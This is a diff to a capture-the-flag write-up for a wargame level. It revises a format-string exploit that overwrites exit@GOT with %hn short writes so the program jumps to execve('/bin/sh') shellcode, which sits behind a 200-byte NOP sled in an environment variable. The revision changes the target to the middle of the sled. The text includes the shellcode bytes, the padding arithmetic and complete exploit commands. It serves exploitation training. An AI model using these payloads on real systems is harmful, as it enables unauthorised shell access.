@@ -169,13 +169,15 @@ export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x
 ```
 
 **Components:**
-- **200 NOPs** (`\x90`) - Large NOP sled for reliability
+- **200 NOPs** (`\x90`) - Landing zone for address variations  
 - **23-byte shellcode** - Standard `execve("/bin/sh", NULL, NULL)`
 
 **Why this works:**
 - Environment variables are stored **outside** the input buffer
 - They don't pass through the uppercase→lowercase conversion
 - Shellcode remains intact!
+
+**Why 200 NOPs?** GDB addresses ≠ runtime addresses. Targeting the middle of the NOP sled provides ±100 bytes tolerance for address shifts.
 
 ### Step 4: Find Shellcode Address
 
@@ -190,35 +192,32 @@ gdb ./level05
 
 **Search output for:** `SHELLCODE=\220\220\220...`
 
-**Found at:**
+**Found at:** `0xffffdd28`
+
+**Calculate middle of NOP sled:**
+
 ```
-0xffffdd28: "SHELLCODE=\220\220\220..."
-0xffffddf0: "\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311"
+0xffffdd28 + 10 ("SHELLCODE=") + 100 (half of NOPs) = 0xffffdd96
 ```
 
-The shellcode (after NOPs) is at **`0xffffddf0`**.
+Targeting the middle provides ±100 bytes tolerance for address variations.
 
 **Address safety check:**
-- `0xff` ✅ Safe
-- `0xff` ✅ Safe  
-- `0xdd` ✅ Safe
-- `0xf0` ✅ Safe
-
-Excellent! No uppercase bytes.
+- `0xff` `0xff` `0xdd` `0x96` ✅ No uppercase bytes
 
 ### Step 5: Calculate Format String Payload
 
-**Goal:** Write `0xffffddf0` to `0x080497e0` (exit@GOT)
+**Goal:** Write `0xffffdd96` to `0x080497e0` (exit@GOT)
 
 We'll use **short writes** (`%hn`) to write 2 bytes at a time:
 
 ```
-Target address 0xffffddf0 split into:
-  Lower 2 bytes: 0xddf0 = 56816 (decimal)
+Target address 0xffffdd96 split into:
+  Lower 2 bytes: 0xdd96 = 56726 (decimal)
   Upper 2 bytes: 0xffff = 65535 (decimal)
 
 Write to:
-  0x080497e0 ← 0xddf0
+  0x080497e0 ← 0xdd96
   0x080497e2 ← 0xffff
 ```
 
@@ -230,11 +229,11 @@ Write to:
 ├──────────────────────────────────────────────────┤
 │ 4 bytes: 0x080497e2 (exit@GOT+2)                │ ← Position 11
 ├──────────────────────────────────────────────────┤
-│ %56808x (pad to 56816 total bytes)              │
+│ %56718x (pad to 56726 total bytes)              │
 ├──────────────────────────────────────────────────┤
 │ %10$hn (write to position 10 = exit@GOT)        │
 ├──────────────────────────────────────────────────┤
-│ %8719x (pad to 65535 total bytes)               │
+│ %8809x (pad to 65535 total bytes)               │
 ├──────────────────────────────────────────────────┤
 │ %11$hn (write to position 11 = exit@GOT+2)      │
 └──────────────────────────────────────────────────┘
@@ -242,9 +241,9 @@ Write to:
 
 **Calculation:**
 1. Addresses written: 8 bytes
-2. Need total of 56816 bytes: `56816 - 8 = 56808` (padding needed)
-3. Write `0xddf0` to first address with `%10$hn`
-4. Need total of 65535 bytes: `65535 - 56816 = 8719` (more padding)
+2. Need total of 56726 bytes: `56726 - 8 = 56718` (padding needed)
+3. Write `0xdd96` to first address with `%10$hn`
+4. Need total of 65535 bytes: `65535 - 56726 = 8809` (more padding)
 5. Write `0xffff` to second address with `%11$hn`
 
 ### Execution Flow
@@ -252,7 +251,7 @@ Write to:
 ```
 ┌─────────────────────────────────────┐
 │ 1. SHELLCODE in environment         │
-│    Address: 0xffffddf0              │
+│    Address: 0xffffdd96              │
 └──────────────┬──────────────────────┘
                │
                ▼
@@ -264,7 +263,7 @@ Write to:
                ▼
 ┌─────────────────────────────────────┐
 │ 3. %hn writes overwrite exit@GOT    │
-│    0x080497e0 → 0xffffddf0          │
+│    0x080497e0 → 0xffffdd96          │
 └──────────────┬──────────────────────┘
                │
                ▼
@@ -289,9 +288,9 @@ import struct
 
 payload = struct.pack("<I", 0x080497e0)    # exit@GOT
 payload += struct.pack("<I", 0x080497e2)   # exit@GOT+2
-payload += "%56808x"                       # Pad to 56816 bytes
-payload += "%10$hn"                        # Write 0xddf0
-payload += "%8719x"                        # Pad to 65535 bytes
+payload += "%56718x"                       # Pad to 56726 bytes
+payload += "%10$hn"                        # Write 0xdd96
+payload += "%8809x"                        # Pad to 65535 bytes
 payload += "%11$hn"                        # Write 0xffff
 ```
 
@@ -305,7 +304,7 @@ ssh level05@localhost -p 2222
 export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 
 # Run exploit
-(python -c 'import struct; print struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%56808x%10$hn%8719x%11$hn"'; cat) | ./level05
+(python -c 'import struct; print struct.pack("<I", 0x080497e0) + struct.pack("<I", 0x080497e2) + "%56718x%10$hn%8809x%11$hn"'; cat) | ./level05
 ```
 
 ### Output
@@ -375,9 +374,9 @@ Input processing:
 When writing large values with `%n`, we risk printing millions of bytes. Short writes (`%hn`) solve this:
 
 ```
-Full write (%n):  Write 4 bytes (0xffffddf0 = 4294958576 bytes to print!)
+Full write (%n):  Write 4 bytes (0xffffdd96 = 4294958486 bytes to print!)
 Short write (%hn): Write 2 bytes at a time
-  First write:  0xddf0 (56816 bytes)
+  First write:  0xdd96 (56726 bytes)
   Second write: 0xffff (65535 bytes)
 ```
 
@@ -412,7 +411,7 @@ The character transformation is an interesting security measure, but:
 
 This exploit relies on predictable addresses:
 - Buffer address: `0xffffdbc8` (consistent)
-- Environment address: `0xffffddf0` (consistent)
+- Environment address: `0xffffdd96` (consistent)
 - GOT address: `0x080497e0` (static)
 
 With ASLR enabled, these addresses would randomize on each run, requiring information leaks first.
